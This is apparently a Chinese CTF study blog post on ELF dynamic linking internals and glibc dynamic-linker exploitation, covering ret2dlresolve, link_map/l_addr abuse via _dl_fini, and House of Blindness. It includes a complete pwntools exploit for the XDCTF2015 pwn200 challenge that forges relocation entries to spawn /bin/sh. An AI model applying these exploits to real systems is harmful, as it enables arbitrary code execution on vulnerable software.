---
title: dl 相关攻击
date: 2024-04-30 00:00:00
tags:
  - pwn
excerpt: 一些 dl 类型攻击手法的总结
---

# 动态链接
## 机制
使用动态链接时，程序按模块拆分为多个独立部分，在程序运行时才链接在一起。linux中ELF动态链接文件称为动态共享对象(DSO)，以`.so`为拓展名。常用的C语言运行库glibc保存为`libc.so`。

链接的操作由动态链接器ld完成。运行时动态链接器与普通共享对象一同被映射到进程的地址空间，程序在运行时首先运行ld，完成所有动态链接工作后再转交主程序。

如果程序中存在跨模块的数据访问，由于目标变量的地址要在装载时才能确定，需要使得程序中的代码地址无关。于是把跟地址相关的代码放在数据段里，即全局偏移表(Global Offset Table)。至于模块间的调用，跳转，也用GOT表实现，但是出于效率考虑，需要引入延迟绑定机制。

延迟绑定(Lazy Binding)的思想是在程序第一次用到时才绑定(符号查找，重定位)，使用PLT表(Procedure Linkage Table)实现，实现代码如下:

```assembly
PLT0:
push *(GOT + 4)
jump *(GOT + 8)
...

bar@plt:
jmp *(bar@GOT)
push n
jump PLT0
```
(此处的实现与之后的利用密切相关)

其中`bar@GOT`中初始保存`bar@plt`的下一条指令(原地tp)，随后push的n是bar在重定位表项中的序号。`GOT + 4` 中保存一个名为`link_map`的结构体的地址，它保存了本模块动态链接的相关信息，`GOT + 8`中保存`_dl_runtime_resolve()`的地址，该函数的作用便是解析`link_map`，计算出bar函数的真正地址，并将其填入`bar@GOT`中

## 实现结构
### `.interp`段
一个字符串，动态连接器的路径

### `.dynamic`段
`readelf -d Lib.so`查看
保存了动态连接器所需的基本信息，结构如下
```c
typedef struct
{
   Elf32_Sword   d_tag;          /* Dynamic entry type */
   union
     {
       Elf32_Word d_val;         /* Integer value */
       Elf32_Addr d_ptr;         /* Address value */
     } d_un;
 } Elf32_Dyn;
 
typedef struct
{
	Elf64_Sxword d_tag; /* Dynamic entry type */
	union
	  {
		Elf64_Xword d_val; /* Integer value */
		Elf64_Addr d_ptr; /* Address value */
	  } d_un;
} Elf64_Dyn;
```
在`elf.h`中定义了不同d_tag的值与对应类型，后面比较常用的有
- `DT_REL` 动态链接重定位表地址
- `DT_SYMTAB` 动态链接符号表地址
- `DT_STRTAB` 动态链接字符串表地址
- `DT_INIT` 初始化代码地址
- `DT_FINI` 结束代码地址

### `DT_REL`动态链接重定位表
`readelf -r Lib.so`查看
共享对象的重定位在装载时完成，重定位表分为`.rel.dyn`和`.rel.plt`。前者修正数据引用，即`.got`和`.data`；后者修正`.got.plt`。
```c
typedef struct
{
	Elf32_Addr r_offset; /* Address */
	Elf32_Word r_info; /* Relocation type and symbol index */
} Elf32_Rel;

typedef struct
{
	Elf64_Addr r_offset; /* Address */
	Elf64_Xword r_info; /* Relocation type and symbol index */
} Elf64_Rel;

/* How to extract and insert information held in the r_info field. */

#define ELF32_R_SYM(val) ((val) >> 8)
#define ELF32_R_TYPE(val) ((val) & 0xff)
#define ELF32_R_INFO(sym, type) (((sym) << 8) + ((type) & 0xff))

#define ELF64_R_SYM(i) ((i) >> 32)
#define ELF64_R_TYPE(i) ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) << 32) + (type))
```
`r_offset`表示需要修正的地址，`r_info`高位表示该符号在符号表中的序号，低位表示符号类型。

### `DT_SYMTAB` 动态链接符号表
`readelf -sD Lib.so`查看
通常保存在段`.dynsym`
```c
typedef struct
{
	Elf32_Word st_name; /* Symbol name (string tbl index) */
	Elf32_Addr st_value; /* Symbol value */
	Elf32_Word st_size; /* Symbol size */
	unsigned char st_info; /* Symbol type and binding */
	unsigned char st_other; /* Symbol visibility */
	Elf32_Section st_shndx; /* Section index */
} Elf32_Sym;

typedef struct
{
	Elf64_Word st_name; /* Symbol name (string tbl index) */
	unsigned char st_info; /* Symbol type and binding */
	unsigned char st_other; /* Symbol visibility */
	Elf64_Section st_shndx; /* Section index */
	Elf64_Addr st_value; /* Symbol value */
	Elf64_Xword st_size; /* Symbol size */
} Elf64_Sym;

/* How to extract and insert information held in the st_info field. */

#define ELF32_ST_BIND(val) (((unsigned char) (val)) >> 4)
#define ELF32_ST_TYPE(val) ((val) & 0xf)
#define ELF32_ST_INFO(bind, type) (((bind) << 4) + ((type) & 0xf))

/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field. */
#define ELF64_ST_BIND(val) ELF32_ST_BIND (val)
#define ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)
#define ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))
```

### `DT_STRTAB` 动态链接字符串表
`.dynstr`中
存储字符串，无需赘述
### `link_map`
一个结构体，保存动态链接相关信息
代码太长不贴，有两个比较重要的部分
- `l_addr` 程序的基址
- `l_info[]`一个数组，保存了多个重定位项的地址


### 总结
调用`_dl_runtime_resolve`时，传参`link_map`和`rel_offset`，查找流程如下
```c
_dl_runtime_resolve(link_map, rel_offset)
                                       +
          +-----------+                |
          | Elf32_Rel | <--------------+
          +-----------+
     +--+ | r_offset  |        +-----------+
     |    |  r_info   | +----> | Elf32_Sym |
     |    +-----------+        +-----------+      +----------+
     |      .rel.plt           |  st_name  | +--> | system\0 |
     |                         |           |      +----------+
     v                         +-----------+        .dynstr
+----+-----+                      .dynsym
| <system> |
+----------+
  .got.plt
```

# ret2dlresolve
## 原理
调用`_dl_runtime_resolve`后，实际完成绑定工作的是其中调用的`_dl_fixup`
```c
/* This function is called through a special trampoline from the PLT the
first time each PLT entry is called. We must perform the relocation
specified in the PLT of the given shared object, and return the resolved
function address to the trampoline, which will restart the original call
to that address. Future calls will bounce directly from the PLT to the
function. */

DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
		ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
		struct link_map *l, ElfW(Word) reloc_arg)
{
	const ElfW(Sym) *const symtab
	 = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
	const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

	const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);

	const PLTREL *const reloc
	 = (const void *) (D_PTR (l, l_info[DT_JMPREL])
			+ reloc_offset (pltgot, reloc_arg));
	const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
	const ElfW(Sym) *refsym = sym;
	void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
	lookup_t result;
	DL_FIXUP_VALUE_TYPE value;

	/* Sanity check that we're really looking at a PLT relocation. */
	assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

	/* Look up the target symbol. If the normal lookup rules are not
		used don't look in the global scope. */
	if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
	  {
		const struct r_found_version *version = NULL;

		if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	  {
		const ElfW(Half) *vernum =
		  (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
		ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
		version = &l->l_versions[ndx];
		if (version->hash == 0)
			version = NULL;
	  }

		/* We need to keep the scope around so do some locking. This is
		not necessary for objects which cannot be unloaded or when
		we are not using any threads (yet). */
		int flags = DL_LOOKUP_ADD_DEPENDENCY;
		if (!RTLD_SINGLE_THREAD_P)
	  {
		THREAD_GSCOPE_SET_FLAG ();
		flags |= DL_LOOKUP_GSCOPE_LOCK;
	  }

#ifdef RTLD_ENABLE_FOREIGN_CALL
		RTLD_ENABLE_FOREIGN_CALL;
#endif

		result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
					version, ELF_RTYPE_CLASS_PLT, flags, NULL);

		/* We are done with the global scope. */
		if (!RTLD_SINGLE_THREAD_P)
	  THREAD_GSCOPE_RESET_FLAG ();

#ifdef RTLD_FINALIZE_FOREIGN_CALL
		RTLD_FINALIZE_FOREIGN_CALL;
#endif

		/* Currently result contains the base load address (or link map)
		of the object that defines sym. Now add in the symbol
		offset. */
		value = DL_FIXUP_MAKE_VALUE (result,
					SYMBOL_ADDRESS (result, sym, false));
	  }
	else
	  {
		/* We already found the symbol. The module (and therefore its load
address) is also known. */
		value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
		result = l;
	  }

	/* And now perhaps the relocation addend. */
	value = elf_machine_plt_value (l, reloc, value);

	if (sym != NULL
		&& __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
	  value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

	/* Finally, fix up the plt itself. */
	if (__glibc_unlikely (GLRO(dl_bind_not)))
		return value;

	return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);

}
```

```c
/* All references to the value of l_info[DT_PLTGOT],
l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],
l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]
have to be accessed via the D_PTR macro. The macro is needed since for
most architectures the entry is already relocated - but for some not
and we need to relocate at access time. */
#ifdef DL_RO_DYN_SECTION
# define D_PTR(map, i) ((map)->i->d_un.d_ptr + (map)->l_addr)
#else
# define D_PTR(map, i) (map)->i->d_un.d_ptr
#endif
```
该函数查找函数对应的重定位表项通过:
```c
	const PLTREL *const reloc
	 = (const void *) (D_PTR (l, l_info[DT_JMPREL])
			+ reloc_offset (pltgot, reloc_arg));
```

即通过`link_map`中的`l_info`数组中的`DT_JMPREL`项找到`.rel.plt`地址，加上先前传入参数`reloc_arg`的偏移。这里的利用方法就是通过传入错误的`reloc_arg`，使其查找到我们伪造好的`.rel.plt`项，实现对重定位项的劫持，解析为我们想要的函数。

由延迟绑定的机制可知，我们需要先压栈我们需要的`reloc_arg`，随后调用`plt0`。并在对应地址上伪造好`.rel.plt`，`dynsym`，`dynstr`。在`dynstr`中写入想要解析的任意函数即可。

具体伪造方法以XDCTF2015 pwn200为例

## 例
题目源码
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```
题目为32位，只开了NX，Partial RELRO
由于溢出长度不够，我们先进行一次栈迁移，在已知的目标地址上写入我们的伪造项
exp如下:
```c
#!/usr/bin/env python
#-*- coding: utf-8 -*-
from pwn import*
import os

context(os = 'linux', arch = 'i386', log_level = 'debug', terminal = ['tmux', 'new-window'])

def debug(cmd = ''):
	if len(sys.argv)!=1:
		return
	cmd += """
	b system
	"""
	gdb.attach(p, cmd)
	pause()

def exp(host = "0.0.0.0", port=11451, exe = "./vuln"):
  global p
  if len(sys.argv)==1:
    p = process(exe)
  else:
    p = remote(host, port)
  pass
  elf = ELF('./vuln')

  leave_ret = 0x08049105
  pop3 = 0x080491e9
  pop_ebp = 0x080491eb

  write_plt = elf.plt['write']
  write_got = elf.got['write']
  read_plt = elf.plt['read']

  plt_0    = elf.get_section_by_name('.plt').header.sh_addr
  rel_plt  = elf.get_section_by_name('.rel.plt').header.sh_addr
  dynsym   = elf.get_section_by_name('.dynsym').header.sh_addr     
  dynstr   = elf.get_section_by_name('.dynstr').header.sh_addr     
  bss_addr = elf.get_section_by_name('.bss').header.sh_addr
  text_addr = elf.get_section_by_name('.text').header.sh_addr

  base_addr = bss_addr + 0x800

  payload = b"\x00" * (112)
  payload += flat([read_plt, pop3, 0, base_addr, 0x100, pop_ebp, base_addr -4, leave_ret])
  p.recv()
  p.send(payload)

  reloc_index = base_addr + 24 - rel_plt 
  fake_sym_addr = base_addr + 32
  align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
  fake_sym_addr += align

  r_sym = int((fake_sym_addr - dynsym) / 0x10)
  r_type = 0x7
  r_info = (r_sym << 8) + (r_type & 0xff) 
  fake_reloc = flat([write_got, r_info])

  st_name = fake_sym_addr + 0x10 - dynstr
  st_bind = 0x1
  st_type = 0x2
  st_info = (st_bind << 4) + (st_type & 0xf)
  fake_sym = flat([st_name, 0, 0, st_info])

  payload = flat([plt_0, reloc_index, 0x08049196, base_addr + 0x80, 0, 0])
  payload += fake_reloc
  payload += b"\x00" * align
  payload += fake_sym
  payload += b"system\x00"
  payload = payload.ljust(0x80, b"\x00")
  payload += flat([b"/bin/sh\x00"])
  payload = payload.ljust(0x100, b"\x00")
  p.send(payload)

if __name__ == '__main__':
	exp()
	p.interactive()
```

注意dl相关函数占用较多栈空间，迁移之后可能出现栈生长到其他不可写段的情况，所以迁移的地址需要离bss足够远。
## 64位情况
存在以下区别:
- 在32位中，`reloc_arg`作为偏移量，而在64位中作为`.rel.plt`的数组下标
- 结构体均升级为64位版本
- version问题
version问题如下
```c
if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
{
	const ElfW(Half) *vernum =
	  (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	version = &l->l_versions[ndx];
	if (version->hash == 0)
		version = NULL;
}
```
此处把`(reloc->r_info)>>32`作为下标取值`vernum`，由于我们伪造的`(reloc->r_info)>>32`很大，导致容易取到不可读区域。

解决方法之一是避免进入该循环，即使得`l->l_info[VERSYMIDX (DT_VERSYM)]`为0，地址为`link_map+0x1c8`。然而这需要泄露ld地址，都有地址了还打ret2dl就不礼貌了。

另一种解决方案是选择不进入`if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)`的大循环，而是走else分支
```c
else
  {
	/* We already found the symbol. The module (and therefore its load
address) is also known. */
	value = DL_FIXUP_MAKE_VALUE (l, l->addr + sym->st_value);
	result = l;
  }
```

`DL_FIXUP_MAKE_VALUE`用于计算函数真实值。我们只需将`sym->st_value`指向某个已解析函数的got表，`l->addr`指向目标函数和已解析函数的偏移。

在不泄露ld的情况下伪造`l->addr`，我们需要伪造`link_map`，一般需要满足:
1.`link_map`中的`DT_STRTAB`、`DT_SYMTAB`、`DT_JMPREL`可读  
2.`DT_SYMTAB`结构体中的`d_ptr`即`sym`，`*(sym+5) & 0x03 != 0`  
3.`(reloc->r_info)&0xff == 7`
4.`rel_addr = l->addr + reloc->r_offset`即原先需要修改的got表地址有可写权限  
5.`l->l_addr + sym->st_value` 为system的地址


# `_dl_fini`的利用
## 特性
该函数在ld.so中，在exit时调用，并对`.fini`和`.fini_array`中函数进行调用。
```c
/* Is there a destructor function? */
if (l->l_info[DT_FINI_ARRAY] != NULL
	|| (ELF_INITFINI && l->l_info[DT_FINI] != NULL))
  {
	/* When debugging print a message first. */
	if (__builtin_expect (GLRO(dl_debug_mask)
					& DL_DEBUG_IMPCALLS, 0))
		_dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",
		 				DSO_FILENAME (l->l_name),
						ns);
	/* First see whether an array is given. */
	if (l->l_info[DT_FINI_ARRAY] != NULL)
	  {
		ElfW(Addr) *array =
		  (ElfW(Addr) *) (l->l_addr
						+ l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
		unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
						/ sizeof (ElfW(Addr)));
		while (i-- > 0)
			((fini_t) array[i]) ();
	  }
  
	/* Next try the old-style destructor. */
	if (ELF_INITFINI && l->l_info[DT_FINI] != NULL)
		DL_CALL_DT_FINI
			(l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
}
```

这里对`.fini_array`的定位是通过`l->l_addr+ l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`实现的，这就给了我们操作的空间
## HitconCTF2023 Wall-Sina
源码如下:
```c
#include <unistd.h>
#include <stdio.h>

int main();

char buff[0x48];
void *const gift = main;

int main() {
    read(STDIN_FILENO, buff, 0x40);
    printf(buff);
}
```
保护全开
栈上残留了指针`_rtld_global`和`_rtld_global._dl_ns[0]._ns_loaded`，读`rtld_global`结构体源码可知，`_ns_loaded`是结构体`link_map`的指针
故我们可以通过fmt任意写在`link_map`的第一项，也就是`l_addr`处写任意地址。
题目在`.data.rel`保留了一个main的指针，且在`.fini_array`后不远处，故我们可以改写`l_addr`的LSB，使`l->l_addr+ l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`指向该指针，达成第二次fmt。在泄露各地址之后还能再该`l_addr`使`.fini`定位到main达成第三次fmt。

## House of Blindness
该手法无需泄露地址，需要mmap相关的任意写

依旧是改写`l_addr`的LSB，使`l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr`指向目标函数。然而`.dynamic`很大，超过了256bytes，这意味着可能需要爆破一个byte。

该手法给出了不用爆破的解决方案。使用`.dynamic`段中的`DT_DEBUG`项。该项指向了一个位于ld.so中的`_r_debug`结构，且有可写权限，可以通过覆盖LSB达成对libc函数的调用。
由于ld.so地址在libc.so之后，地址显然更大，可以将`l_addr`改为负数(补码形式)来解决。
另外，此时的rdi正好落在`dl_load_lock`上，位于ld.so中，也是可控的。

---
参考资料:
- [[看雪]dl_runtime_resolve结合源码分析及常见的几种攻击手法](https://bbs.kanxue.com/thread-253833.htm#msg_header_h2_2)
- [CTF-All-In-One](https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md)
- [[知乎]HitconCTF2023 pwn Wall-Sina wp](https://zhuanlan.zhihu.com/p/657009223)
- [[Hackmd]house of blindness](https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA#refining-our-exploit-with-_r_debug)
- 《程序员的自我修养》